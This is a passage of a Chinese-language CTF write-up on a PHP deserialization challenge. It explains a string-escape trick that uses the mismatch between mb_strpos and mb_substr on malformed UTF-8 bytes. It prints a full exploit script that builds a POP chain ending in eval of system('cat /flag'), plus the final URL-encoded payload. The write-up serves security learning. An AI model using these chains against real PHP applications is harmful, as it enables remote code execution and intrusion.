+<p><img src="/img/image-20240921164315257.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921164315257"
+	
+	
+></p>
+<p>生成payload后别忘了手动将键名2改为1，不能直接写两个1，这样会导致value直接变为null</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$s7 = array(&#39;1&#39;=&gt;$s6,&#39;2&#39;=&gt;null);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后就是substrstr函数，看似返回中括号内容和下文一致没什么错误</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function substrstr($data)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $start = mb_strpos($data, &#34;[&#34;);
+</span></span><span class="line"><span class="cl">    $end = mb_strpos($data, &#34;]&#34;);
+</span></span><span class="line"><span class="cl">    return mb_substr($data, $start + 1, $end - 1 - $start);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">                  --------------- ---
+</span></span><span class="line"><span class="cl">$ser_ctf = substrstr($pre.&#34;[&#34;.serialize($ctf).&#34;]&#34;);                   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>实际上生成的数据没有中括号而且前面还有三十八位无效数据影响反序列化</p>
+<p><img src="/img/image-20240921165521033.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921165521033"
+	
+	
+></p>
+<p>本地尝试发现序列化数据被截取后是无法执行的</p>
+<p><img src="/img/image-20240921170146075.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921170146075"
+	
+	
+></p>
+<p>关于mb_strpos和mb_substr的知识，</p>
+<blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节
+</span></span><span class="line"><span class="cl">每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节
+</span></span><span class="line"><span class="cl">每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">unicode占4字节，mb_substr会将数据%f0abc中的ab拿去补全四字节，从而认为该数据只有c的一个字节
+</span></span><span class="line"><span class="cl">%f0%9fab这种则会保留最少一位b，所以又认为只有一字节
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>根据原先构造链输出我们需要的数据是不需要前面这38位的，可以利用以上知识利用字符串逃逸来截取掉这38位数据只留我们的payload</p>
+<p><img src="/img/image-20240921171018546.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921171018546"
+	
+	
+></p>
+<p>最终exp，别忘了将生成数据键名改为1！</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$a = &#34;%f0abc&#34;;
+</span></span><span class="line"><span class="cl">error_reporting(0);
+</span></span><span class="line"><span class="cl">function substrstr($data)//提权中括号之间的内容
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    $start = mb_strpos($data, &#34;[&#34;);
+</span></span><span class="line"><span class="cl">    $end = mb_strpos($data, &#34;]&#34;);
+</span></span><span class="line"><span class="cl">    return mb_substr($data, $start + 1, $end - 1 - $start);
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class Hacker
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $start;
+</span></span><span class="line"><span class="cl">    public $end;
+</span></span><span class="line"><span class="cl">    public $username = &#34;ctfer&#34;;
+</span></span><span class="line"><span class="cl">    public function __wakeup()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $this-&gt;username = &#34;hacker&#34;;
+</span></span><span class="line"><span class="cl">        $this-&gt;end = $this-&gt;start;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __destruct()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        if (!preg_match(&#39;/ctfer/i&#39;, $this-&gt;username)) {
+</span></span><span class="line"><span class="cl">            echo &#39;Hacker！&#39;;
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class C
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $c;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __toString()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        $this-&gt;c-&gt;c();
+</span></span><span class="line"><span class="cl">        return &#34;C&#34;;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class T
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $t;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __call($name, $args)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        echo $this-&gt;t-&gt;t;
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class F
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $f;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __get($name)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        return isset($this-&gt;f-&gt;f);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class E
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $e;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __isset($name)
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        ($this-&gt;e)();
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">class R
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    public $r;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    public function __invoke()
+</span></span><span class="line"><span class="cl">    {
+</span></span><span class="line"><span class="cl">        eval($this-&gt;r);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$s1 = new R();
+</span></span><span class="line"><span class="cl">$s1-&gt;r = &#34;system(&#39;cat /flag&#39;);&#34;;
+</span></span><span class="line"><span class="cl">$s2 = new E();
+</span></span><span class="line"><span class="cl">$s2-&gt;e = $s1;
+</span></span><span class="line"><span class="cl">$s3 = new F();
+</span></span><span class="line"><span class="cl">$s3-&gt;f = $s2;
+</span></span><span class="line"><span class="cl">$s4 = new T();
+</span></span><span class="line"><span class="cl">$s4-&gt;t = $s3;
+</span></span><span class="line"><span class="cl">$s5 = new C();
+</span></span><span class="line"><span class="cl">$s5-&gt;c = $s4;
+</span></span><span class="line"><span class="cl">$s6 = new Hacker();
+</span></span><span class="line"><span class="cl">$s6-&gt;end = &amp;$s6-&gt;username;
+</span></span><span class="line"><span class="cl">$s6-&gt;start = $s5;
+</span></span><span class="line"><span class="cl">$s7 = array(&#39;1&#39;=&gt;$s6,&#39;2&#39;=&gt;null);
+</span></span><span class="line"><span class="cl">//echo serialize($s7).&#34;\n&#34;;
+</span></span><span class="line"><span class="cl">//echo urlencode(serialize($s7)).&#34;\n&#34;;
+</span></span><span class="line"><span class="cl">echo &#34;?substr=&#34;.str_repeat($a,12).&#34;%f0%9fab&amp;ez[ser.from_you=&#34;.urlencode(serialize($s7)).&#34;\n&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab&amp;ez[ser.from_you=a%3A2%3A%7Bi%3A1%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A5%3A%22ctfer%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3BN%3B%7D
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>solved!</p>
+<p><img src="/img/image-20240921171352591.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240921171352591"
 	
 	
 ></p>
